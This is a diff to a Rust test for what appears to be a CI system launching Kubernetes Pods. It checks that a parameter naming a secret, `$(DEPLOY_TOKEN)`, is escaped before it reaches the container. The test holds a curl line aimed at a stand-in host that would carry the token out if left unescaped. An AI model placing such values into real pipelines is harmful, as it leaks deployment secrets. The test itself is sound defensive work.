@@ -3,8 +3,10 @@
 //! Kubernetes expands `$(VAR)` in a container's `command`, `args` and
 //! `env[].value` from that container's environment, and Step secrets are plain
 //! env vars. So a dispatch parameter `https://example.invalid/?t=$(DEPLOY_TOKEN)`
-//! rendered into `[curl, "${{ inputs.url }}"]` would become the secret before
-//! `curl` ever ran, with no shell involved.
+//! rendered into an env value would become the secret before the Step ever
+//! ran, with no shell involved. A free-text parameter never reaches `command`
+//! (ADR-0076: it is refused there), so it rides in through `env:`; the same
+//! escaping covers a `$(NAME)` the Pipeline itself writes in `command`.
 //!
 //! This drives the whole launch path that exists without a cluster: frozen Run
 //! params → the scheduler's render → `K8sExecutor::launch` → the Pod it POSTs
@@ -64,8 +66,11 @@ async fn fake_api() -> (String, Created) {
 fn curl_spec() -> StepSpec {
     StepSpec {
         image: "curlimages/curl".into(),
-        command: vec!["curl".into(), "${{ inputs.url }}".into()],
-        env: vec![],
+        command: vec![
+            "curl".into(),
+            "https://example.invalid/?t=$(DEPLOY_TOKEN)".into(),
+        ],
+        env: vec![("URL".into(), "${{ inputs.url }}".into())],
         secrets: vec![],
         run_as_root: false,
         add_capabilities: vec![],
@@ -74,7 +79,6 @@ fn curl_spec() -> StepSpec {
         workspace_inputs: vec![],
         workspace_outputs: vec![],
         cache: None,
-        clone: None,
         build: None,
         artifacts: vec![],
         placement_profiles: vec![],
@@ -84,6 +88,8 @@ fn curl_spec() -> StepSpec {
         services: Vec::new(),
         uses: Vec::new(),
         matrix_values: Default::default(),
+        scope: None,
+        forge_token: None,
     }
 }
 
@@ -122,7 +128,22 @@ async fn a_param_naming_a_secret_reaches_the_pod_escaped() {
     assert_eq!(
         container["command"],
         json!(["curl", "https://example.invalid/?t=$$(DEPLOY_TOKEN)"]),
-        "Kubernetes reduces `$$` to `$`, so curl receives the URL as rendered"
+        "Kubernetes reduces `$$` to `$`, so curl receives the URL as written"
+    );
+    let env_value = |name: &str| {
+        container["env"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|e| e["name"] == name)
+            .unwrap_or_else(|| panic!("{name} is set"))["value"]
+            .clone()
+    };
+    // The parameter, rendered into an authored env value.
+    assert_eq!(
+        env_value("URL"),
+        json!("https://example.invalid/?t=$$(DEPLOY_TOKEN)"),
+        "the rendered parameter reaches the Step as text"
     );
     // The same value rides in as `SCARAB_PARAM_URL`; env values expand too.
     let param_env = container["env"]
